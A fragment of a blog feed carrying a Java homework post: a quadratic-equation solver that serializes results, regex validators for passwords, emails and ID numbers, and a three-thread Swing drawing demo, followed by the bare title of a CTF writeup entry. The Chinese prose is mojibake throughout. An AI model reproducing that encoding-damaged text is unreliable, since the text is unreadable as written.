boxæŒ‰é’®å°†ä¼šæ¸…ç©ºè¾“å…¥æ¡†ã€‚</p><p>8. ç‚¹å‡»Exitå°†ä¼šå¼¹å‡ºç¡®è®¤å¯¹è¯æ¡†ï¼Œç¡®è®¤åé€€å‡ºç¨‹åºã€‚</p><p><img src="/img/07f348e964df8f04805726fa5d51b14a.jpeg"></p><p>ä»£ç ï¼ˆå‘½ä»¤è¡Œæ¨¡å¼ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandLineMode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> a=<span class="number">0</span>, b=<span class="number">0</span>, c=<span class="number">0</span>;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\n******* Binary Linear Equation Calculator *******\n&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Please input the Quadratic Term Coefficient: &quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                a = scan.nextInt();</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input the Primary Term Coefficient: &quot;</span>);</span><br><span class="line">                b = scan.nextInt();</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input the Constant Term: &quot;</span>);</span><br><span class="line">                c = scan.nextInt();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            BinaryLinearEquation BLEquation;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> (FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;file1.data&quot;</span>);</span><br><span class="line">                 ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos)) &#123;</span><br><span class="line">                BLEquation = <span class="keyword">new</span> BinaryLinearEquation(a, b, c);</span><br><span class="line">                BLEquation.Solve();</span><br><span class="line">                oos.writeObject(BLEquation);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ioException) &#123;</span><br><span class="line">                ioException.printStackTrace();</span><br><span class="line">                System.err.println(ioException.getMessage());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NumberFormatException e1) &#123;</span><br><span class="line">                System.err.println(e1.getMessage());</span><br><span class="line">                System.out.println(BinaryLinearEquation.show);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NonQuadraticEquationException e2) &#123;</span><br><span class="line">                System.err.println(e2.toString());</span><br><span class="line">                BinaryLinearEquation.show = <span class="string">&quot;Refuse to calculate a linear equation.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(BinaryLinearEquation.show);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼ˆå‘½ä»¤è¡Œæ¨¡å¼ï¼‰ï¼š</p><p>1. æ±‚è§£<br>$$<br>{x^2} + 1 = 0<br>$$<br>ç¨‹åºæç¤ºè¯¥æ–¹ç¨‹æœ‰ä¸€å¯¹ç›¸åçš„è™šæ ¹ã€‚<img src="/img/8f6a042a82ec96d3214f19b0cca0d7bb.png"></p><p>2. æ±‚è§£<br>$$<br>{x^2} + 192x + 123 = 0<br>$$<br><img src="/img/cf02ef9332c6b62f754eae822003e25e.png"></p><p>3. æ±‚è§£<br>$$<br>{x^2} + x + 1 = 0<br>$$<br><img src="/img/889436c27ff930316789d6d80d6a3d14.png"></p><ol start="4"><li><p>å½“äºŒæ¬¡é¡¹ç³»æ•°ä¸º0æ—¶ï¼Œç¨‹åºæŠ¥é”™ï¼š</p><p><img src="/img/acf3c7a4181af9e41fd9fd17eb622a67.png"></p></li></ol><p>åŒæ—¶ï¼Œå‘½ä»¤è¡Œæ¨¡å¼ä¹Ÿä¼šå°†åºåˆ—åŒ–åçš„å¯¹è±¡å­˜å…¥file1.dataæ–‡ä»¶ã€‚</p><p><img src="/img/a0c4df0ad7c103c4176c8ea06b7129c6.png"></p><h2 id="ä½œä¸šå››"><a href="#ä½œä¸šå››" class="headerlink" title="ä½œä¸šå››"></a><strong>ä½œä¸šå››</strong></h2><h3 id="æ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ "><a href="#æ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ " class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ "></a>æ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ </h3><p>ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            System.out.println(<span class="string">&quot;Please input mode:&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;[P]Password\t\t\t\t[E]Email\n[I]Citizen ID number\t[Q]Quit&quot;</span>);</span><br><span class="line">            String mode = scanner.next();</span><br><span class="line">            <span class="keyword">if</span> (mode.equalsIgnoreCase(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">                Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input your password:&quot;</span>);</span><br><span class="line">                String pwd = sc.nextLine();</span><br><span class="line">                <span class="keyword">boolean</span> isPwdSafe = validatePassword(pwd);</span><br><span class="line">                <span class="keyword">if</span> (isPwdSafe)</span><br><span class="line">                    System.out.println(<span class="string">&quot;Your password is acceptable.&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;Your password does not meet the requirements.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mode.equalsIgnoreCase(<span class="string">&quot;E&quot;</span>))&#123;</span><br><span class="line">                Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input your email:&quot;</span>);</span><br><span class="line">                String email = sc.nextLine();</span><br><span class="line">                <span class="keyword">boolean</span> isEmail = validateEmail(email);</span><br><span class="line">                <span class="keyword">if</span> (isEmail)</span><br><span class="line">                    System.out.println(<span class="string">&quot;Your Email address is acceptable.&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;Your Email address is not correct.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mode.equalsIgnoreCase(<span class="string">&quot;I&quot;</span>))&#123;</span><br><span class="line">                Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input your citizen ID number:&quot;</span>);</span><br><span class="line">                String id = sc.nextLine();</span><br><span class="line">                <span class="keyword">boolean</span> isIDNum = validateID(id);</span><br><span class="line">                <span class="keyword">if</span> (isIDNum)</span><br><span class="line">                    System.out.println(<span class="string">&quot;Your citizen ID number is acceptable.&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;Your citizen ID number is not correct.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mode.equalsIgnoreCase(<span class="string">&quot;Q&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">validatePassword</span><span class="params">(String password)</span> <span class="comment">//å¯†ç è¾“å…¥æ ¡éªŒæ–¹æ³•</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// å¿…é¡»åŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—çš„ç»„åˆï¼Œå¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ï¼Œé•¿åº¦åœ¨6-16ä¹‹é—´</span></span><br><span class="line">        <span class="keyword">boolean</span> flag;</span><br><span class="line">        flag = password.matches(<span class="string">&quot;^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;6,16&#125;$&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">validateEmail</span><span class="params">(String email)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> flag;</span><br><span class="line">        flag = email.matches(<span class="string">&quot;^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">validateID</span><span class="params">(String IDnum)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 15ä½ã€18ä½</span></span><br><span class="line">        <span class="keyword">boolean</span> flag;</span><br><span class="line">        flag = IDnum.matches(<span class="string">&quot;(^[1-9]\\d&#123;5&#125;(18|19|([23]\\d))\\d&#123;2&#125;((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d&#123;3&#125;[0-9Xx]$)|(^[1-9]\\d&#123;5&#125;\\d&#123;2&#125;((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d&#123;3&#125;$)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p>1.æ»¡è¶³å¯†ç å¤æ‚æ€§éœ€æ±‚ï¼Œè¦æ±‚è‡³å°‘åŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—ï¼Œå¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ï¼Œé•¿åº¦åœ¨6-16ä½ä¹‹é—´ã€‚</p><p><img src="/img/604e7896a8bed985935d05e6066ba951.jpeg"></p><p>2.æ»¡è¶³èº«ä»½è¯å·ç è§„èŒƒï¼ŒåŒ…æ‹¬15ä½å’Œ18ä½ã€‚åŒ…æ‹¬å„éƒ¨åˆ†è§„èŒƒæ£€æŸ¥ï¼Œå¦‚æœˆä»½ä¸å¾—å¤§äº12ï¼Œæ¯æœˆä¸å¾—å¤šäº31å¤©ï¼Œå¹´ä»½ä¸å¾—ä»¥17XXå¼€å¤´ç­‰ã€‚ä¸‹å›¾æ˜¯18ä½èº«ä»½è¯å·ç éªŒè¯ï¼š</p><p><img src="/img/5956fa597116ad86fb24773a3478c6fe.jpeg"></p><p>ä¸‹å›¾æ˜¯15ä½èº«ä»½è¯å·ç éªŒè¯ï¼š</p><p><img src="/img/280b03ae88799433bd6ebba9323c2ddf.jpeg"></p><ol start="3"><li><p>æ»¡è¶³ç”µå­é‚®ä»¶è§„èŒƒï¼š</p><p><img src="/img/e47e43d134ae4f8133c054170d770b0b.jpeg"></p></li></ol><h3 id="åˆ©ç”¨é¼ æ ‡äº‹ä»¶å¯åŠ¨3ä¸ªçº¿ç¨‹åˆ†åˆ«åœ¨ä¸‰ä¸ªçª—å£ä¸­åŒæ—¶ç»˜åˆ¶åŠ¨æ€å›¾å½¢"><a href="#åˆ©ç”¨é¼ æ ‡äº‹ä»¶å¯åŠ¨3ä¸ªçº¿ç¨‹åˆ†åˆ«åœ¨ä¸‰ä¸ªçª—å£ä¸­åŒæ—¶ç»˜åˆ¶åŠ¨æ€å›¾å½¢" class="headerlink" title="åˆ©ç”¨é¼ æ ‡äº‹ä»¶å¯åŠ¨3ä¸ªçº¿ç¨‹åˆ†åˆ«åœ¨ä¸‰ä¸ªçª—å£ä¸­åŒæ—¶ç»˜åˆ¶åŠ¨æ€å›¾å½¢"></a>åˆ©ç”¨é¼ æ ‡äº‹ä»¶å¯åŠ¨3ä¸ªçº¿ç¨‹åˆ†åˆ«åœ¨ä¸‰ä¸ªçª—å£ä¸­åŒæ—¶ç»˜åˆ¶åŠ¨æ€å›¾å½¢</h3><p>ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.MouseAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.MouseEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Control();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    JLabel label1;</span><br><span class="line">    Control()&#123;</span><br><span class="line">        <span class="keyword">this</span>.setBounds(<span class="number">200</span>,<span class="number">450</span>,<span class="number">400</span>,<span class="number">200</span>);</span><br><span class="line">        <span class="keyword">this</span>.setTitle(<span class="string">&quot;æ§åˆ¶ä¸­å¿ƒ&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">        Font font = <span class="keyword">new</span> Font(<span class="string">&quot;å¾®è½¯é›…é»‘&quot;</span>, Font.PLAIN, <span class="number">23</span>);</span><br><span class="line">        label1 = <span class="keyword">new</span> JLabel(<span class="string">&quot;ç‚¹å‡»æœ¬çª—å£ä»¥åŒæ—¶å¯åŠ¨ä¸‰ä¸ªçº¿ç¨‹&quot;</span>);</span><br><span class="line">        label1.setFont(font);</span><br><span class="line">        add(label1);</span><br><span class="line">        <span class="keyword">this</span>.addMouseListener(<span class="keyword">new</span> MouseAdapter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseClicked</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">                actionPerformed();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">()</span></span>&#123;</span><br><span class="line">        myThread ta = <span class="keyword">new</span> myThread(<span class="number">200</span>,<span class="number">100</span>,<span class="number">0</span>);</span><br><span class="line">        myThread tb = <span class="keyword">new</span> myThread(<span class="number">500</span>,<span class="number">100</span>,<span class="number">1</span>);</span><br><span class="line">        myThread tc = <span class="keyword">new</span> myThread(<span class="number">800</span>,<span class="number">100</span>,<span class="number">2</span>);</span><br><span class="line">        ta.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        tb.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        tc.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="keyword">extends</span> <span class="title">JFrame</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> tid;</span><br><span class="line">    Thread t;</span><br><span class="line"></span><br><span class="line">    myThread(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> shape) &#123;</span><br><span class="line">        <span class="keyword">this</span>.tid = shape;</span><br><span class="line">        <span class="keyword">this</span>.setBounds(i, j, <span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">        <span class="keyword">this</span>.setTitle(<span class="string">&quot;Thread &quot;</span>+ shape);</span><br><span class="line">        <span class="keyword">this</span>.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">        startThreadA();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">startThreadA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        t = <span class="keyword">new</span> Thread(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            t.start();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.err.println(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Thread &quot;</span>+<span class="keyword">this</span>.tid +<span class="string">&quot; has started successfully.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                repaint();</span><br><span class="line">                Thread.sleep(<span class="number">255</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.err.println(e.toString());</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.paint(g);</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>.tid)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                g.setColor(Color.RED);</span><br><span class="line">                <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                g.fillRect(<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                g.setColor(Color.ORANGE);</span><br><span class="line">                <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                g.fillOval(<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                g.setColor(<span class="keyword">new</span> Color(<span class="number">7</span>,<span class="number">244</span>,<span class="number">161</span>));</span><br><span class="line">                <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                g.fillRoundRect(<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">100</span>,<span class="number">100</span>,<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœï¼š</strong></p><p>1.ç‚¹å‡»ä¸»æ§çª—å£åŒæ—¶å¯åŠ¨ä¸‰ä¸ªçº¿ç¨‹ï¼Œæ‰“å¼€æ´»åŠ¨ç›‘è§†å™¨ï¼Œæ˜¾ç¤ºå·²åˆ›å»º3ä¸ªçº¿ç¨‹ï¼š</p><p><img src="/img/78f216b49108da6692366aac8c9fbd48.jpeg"></p><p>2. å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸‰ä¸ªçº¿ç¨‹åŒæ—¶å¯åŠ¨ï¼Œå„çª—å£åŒæ—¶ç»˜åˆ¶åŠ¨æ€å›¾å½¢ï¼š</p><p><img src="/img/99480f314689f5a6326af9f4af98928b.png"></p><p><img src="/img/23fb013cb02df91f1a6e311bed35bbfc.png"></p><p>3. å†æ¬¡ç‚¹å‡»ä¸»æ§çª—å£è¿˜å¯ä»¥åˆ›å»ºæ›´å¤šçš„çº¿ç¨‹ï¼š</p><p><img src="/img/07d9f84c47bb6989d3ba9a08efb12b48.png"></p><p>4.çº¿ç¨‹åˆ›å»ºæˆåŠŸååœ¨æ§åˆ¶å°è¾“å‡ºæ—¥å¿—ä¿¡æ¯ï¼š<img src="/img/0349f3f7cd78dd52455bb58aef201dfd.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä½œä¸šä¸€&quot;&gt;&lt;a href=&quot;#ä½œä¸šä¸€&quot; class=&quot;headerlink&quot; title=&quot;ä½œä¸šä¸€&quot;&gt;&lt;/a&gt;&lt;strong&gt;ä½œä¸šä¸€&lt;/strong&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;è®¡ç®—å¤šé¡¹å¼1ï¼+2ï¼+3ï¼â€¦+n!ï¼Œå½“å¤šé¡¹å¼ä¹‹å’Œè¶…è¿‡10000æ—¶åœæ­¢ï¼Œå¹¶è¾“å‡ºç´¯åŠ ä¹‹å’Œä»¥</summary>
      
    
    
    
    
    <category term="Java" scheme="https://zxy.link/tags/Java/"/>
    
    <category term="è¯¾ç¨‹ä½œä¸š" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•ŒWebé¢˜ç›®WPï¼ˆä¸€ï¼‰</title>
    <link href="https://zxy.link/posts/7eaecac2/"/>
    <id>https://zxy.link/posts/7eaecac2/</id>
    <published>2021-11-15T10:00:00.000Z</published>
    <updated>2022-01-23T13:00:14.902Z</updated>
    
